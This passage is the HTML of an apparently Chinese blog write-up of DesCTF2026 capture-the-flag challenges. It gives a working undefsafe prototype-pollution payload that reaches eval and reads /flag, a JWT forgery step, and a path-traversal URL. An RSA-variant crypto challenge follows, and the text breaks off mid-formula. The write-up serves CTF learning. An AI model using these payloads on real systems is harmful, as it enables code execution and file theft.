@@ -1,0 +1,837 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    DesCTF2026 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Web  NoteHub(JWT伪造+undefsafe原型链污染) 源码： 12345678910111213141516171819202122232425262728293031323334const undefsafe &#x3D; require(&#x27;undefsafe&#x27;);const jwt &#x3D; require(&quot;jsonwebtoken&quot;);const">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DesCTF2026">
+<meta property="og:url" content="http://example.com/2026/03/08/DesCTF2026/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="Web  NoteHub(JWT伪造+undefsafe原型链污染) 源码： 12345678910111213141516171819202122232425262728293031323334const undefsafe &#x3D; require(&#x27;undefsafe&#x27;);const jwt &#x3D; require(&quot;jsonwebtoken&quot;);const">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308155840740.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308155849209.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308155938017.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308155957520.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308160044734.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308160122339.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308160707524.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260310162837675.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260310163135428.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260310163843075.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260310163936676.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260310170056203.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260310170148318.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/640.webp">
+<meta property="og:image" content="http://example.com/2026/03/08/images/640-17731337825561.webp">
+<meta property="og:image" content="http://example.com/2026/03/08/images/640-17731337825562.webp">
+<meta property="og:image" content="http://example.com/2026/03/08/images/640-17731337825563.webp">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308234529950.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308234622935.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260308235450412.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/image-20260309000602655.png">
+<meta property="og:image" content="http://example.com/2026/03/08/images/640-177313388291415.webp">
+<meta property="article:published_time" content="2026-03-08T06:53:49.000Z">
+<meta property="article:modified_time" content="2026-03-10T09:11:28.029Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/08/images/image-20260308155840740.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="DesCTF2026">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">DesCTF2026</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#notehubjwt%E4%BC%AA%E9%80%A0undefsafe%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.1.</span> <span class="toc-text"> NoteHub(JWT伪造+undefsafe原型链污染)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-java"><span class="toc-number">1.2.</span> <span class="toc-text"> Baby Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#confrontation"><span class="toc-number">1.3.</span> <span class="toc-text"> Confrontation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#check-inrsa%E5%8F%98%E7%A7%8D"><span class="toc-number">2.1.</span> <span class="toc-text"> Check in(RSA变种)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%BF%91%E4%BC%BC"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 关键近似</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%82k"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 求k</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%BD%E4%BA%BA%E4%BA%8B%E5%90%AC%E5%A4%A9%E5%91%BDmt19937-random%E9%A2%84%E6%B5%8B"><span class="toc-number">2.2.</span> <span class="toc-text"> 尽人事，听天命(MT19937 random预测)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text"> MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wireshark%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-modbustcp"><span class="toc-number">3.1.</span> <span class="toc-text"> wireshark(工控流量分析-modbus&#x2F;TCP)</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-DesCTF2026" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/03/08/DesCTF2026/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-08T06:53:49.000Z" itemprop="datePublished">2026-03-08</time>
+    <time style="display: none;" id="post-update-time">2026-03-10</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="notehubjwt伪造undefsafe原型链污染"><a class="markdownIt-Anchor" href="#notehubjwt伪造undefsafe原型链污染"></a> NoteHub(JWT伪造+undefsafe原型链污染)</h3>
+<p>源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> secretKey = <span class="string">&quot;???&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Notes</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">id</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">title</span> = <span class="string">&quot;Title&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">author</span> = <span class="string">&quot;Author&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note</span> = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">addNote</span>(<span class="params">id, author, content</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note</span>[(id).<span class="title function_">toString</span>()] = &#123;</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: author,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: content</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">            <span class="keyword">let</span> commands = &#123;</span><br><span class="line">                <span class="string">&quot;runner&quot;</span>: <span class="string">&quot;1+1&quot;</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">                <span class="built_in">eval</span>(commands[index]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">showNote</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">showAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>首页是一个登录框：<br />
+<img src="../images/image-20260308155840740.png" alt="image-20260308155840740" /></p>
+<p><img src="../images/image-20260308155849209.png" alt="image-20260308155849209" /></p>
+<p>会给一个token，同时响应包中给了一个hint，16进制解码后是need admin，说明需要伪造admin</p>
+<p>直接爆破：<br />
+<img src="../images/image-20260308155938017.png" alt="image-20260308155938017" /></p>
+<p>再伪造admin:</p>
+<p><img src="../images/image-20260308155957520.png" alt="image-20260308155957520" /></p>
+<p>伪造好之后我们看F12：<br />
+<img src="../images/image-20260308160044734.png" alt="image-20260308160044734" /></p>
+<p>登录成功会跳转到/write，刚好对应我们的addNote函数</p>
+<p>不放心，还是扫个目录：<br />
+<img src="../images/image-20260308160122339.png" alt="image-20260308160122339" /></p>
+<p>有/notes，可以用来看写进去的note</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">addNote</span>(<span class="params">id, author, content</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note</span>[(id).<span class="title function_">toString</span>()] = &#123;</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: author,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: content</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">            <span class="keyword">let</span> commands = &#123;</span><br><span class="line">                <span class="string">&quot;runner&quot;</span>: <span class="string">&quot;1+1&quot;</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">                <span class="built_in">eval</span>(commands[index]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>直接就是undefsafe原型链污染：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9482">谭谈 Javascript 原型链与原型链污染-先知社区</a></p>
+<p>我们既然能看到所有的note，是不是能污染一个note里面执行js代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;constructor.prototype&quot;</span>,<span class="string">&quot;author&quot;</span>:<span class="string">&quot;this.note[&#x27;pwn&#x27;]=&#123;author:require(&#x27;f&#x27;+&#x27;s&#x27;).readFileSync(&#x27;/f&#x27;+&#x27;la&#x27;+&#x27;g&#x27;,&#x27;utf8&#x27;).toString(),content:&#x27;x&#x27;&#125;&quot;</span>,<span class="string">&quot;content&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>这样 <code>for...in</code> 会枚举到继承属性 <code>author</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commands[<span class="string">&quot;author&quot;</span>] === <span class="string">&quot;JS payload&quot;</span></span><br></pre></td></tr></table></figure>
+<p>而JS payload里是直接把 flag 读出来，塞进一个新的 note 里</p>
+<p>再次访问/notes</p>
+<p><img src="../images/image-20260308160707524.png" alt="image-20260308160707524" /></p>
+<h3 id="baby-java"><a class="markdownIt-Anchor" href="#baby-java"></a> Baby Java</h3>
+<p>打开是一个资产管理系统：</p>
+<p><img src="../images/image-20260310162837675.png" alt="image-20260310162837675" /></p>
+<p>由验证码能登录，但我这里尝试过爆破，无解</p>
+<p>继续查看前端代码</p>
+<p><img src="../images/image-20260310163135428.png" alt="image-20260310163135428" /></p>
+<p>发现<code>/ZGXT/waterToDeclareWithAttachment/downLoad</code>接口，但这里我们不知道参数名称，fuzz一下得到fileName</p>
+<p>直接目录穿越拿flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ZGXT/waterToDeclareWithAttachment/downLoad?fileName=../../../../flag</span><br></pre></td></tr></table></figure>
+<h3 id="confrontation"><a class="markdownIt-Anchor" href="#confrontation"></a> Confrontation</h3>
+<p><img src="../images/image-20260310163843075.png" alt="image-20260310163843075" /></p>
+<p><img src="../images/image-20260310163936676.png" alt="image-20260310163936676" /></p>
+<p><img src="../images/image-20260310170056203.png" alt="image-20260310170056203" /></p>
+<p>发现<code>/openapi.json</code>、<code>docs</code></p>
+<p><img src="../images/image-20260310170148318.png" alt="image-20260310170148318" /></p>
+<p>网页信息都丢给 ai 分析一下：</p>
+<p><img src="../images/640.webp" alt="图片" /></p>
+<p>成功拿到编码过的 elf 文件</p>
+<p><img src="../images/640-17731337825561.webp" alt="图片" /></p>
+<p><img src="../images/640-17731337825562.webp" alt="图片" /></p>
+<p>ide 逆向分析一下：</p>
+<p><img src="../images/640-17731337825563.webp" alt="图片" /></p>
+<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
+<h3 id="check-inrsa变种"><a class="markdownIt-Anchor" href="#check-inrsa变种"></a> Check in(RSA变种)</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, inverse</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> p%<span class="number">4</span>==<span class="number">3</span> <span class="keyword">and</span> q%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(p,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">N = p * q</span><br><span class="line">phi_N = (p**<span class="number">2</span> + p + <span class="number">1</span>) * (q**<span class="number">2</span> + q + <span class="number">1</span>)</span><br><span class="line">d = Integer(N)**RR(<span class="number">0.47</span>)</span><br><span class="line">e = inverse(Integer(d), phi_N)</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;&#x27;</span>+md5(<span class="built_in">str</span>(p+q).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e = 20285928988408708385825788658664300305494782819689883492429762785687493161646901961627732482030570554944571523044008931416609595056746847083499405860944240804200816473153171825246196297214879750749954991916614158499347588230595409852985660426387332691700171974951765953937059128044510635005259571262430221092123685629379451869171518153057333553882827808279895371867053070597655168641441209936240962391624079704514097507822408340977683148014817264999772615710237278286803551400605422497036878844692741788304043681532328471441465596285604159664321904195632202009921776619257725630740166796422445907541165144233376010917</span></span><br><span class="line"><span class="string">N = 162318864198120848289602513685294100213662002310524040016141267082602211702801751627271587107738223466644399363879018058536864307889254050305605097781721847474240769410050480646447538698253600786017599233831714710010395996308361674973789283465587010960323042209564459904257042660293061844258544118566558516881</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>生成两个**Blum Prime **<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mtext> </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">p\ and\ q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace"> </span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p>
+<p>且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><msup><mi>p</mi><mn>2</mn></msup><mo>+</mo><mi>p</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>q</mi><mn>2</mn></msup><mo>+</mo><mi>q</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ_{(N)}=(p^2+p+1)(q^2+q+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7857599999999999em;vertical-align:-0.3551999999999999em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" 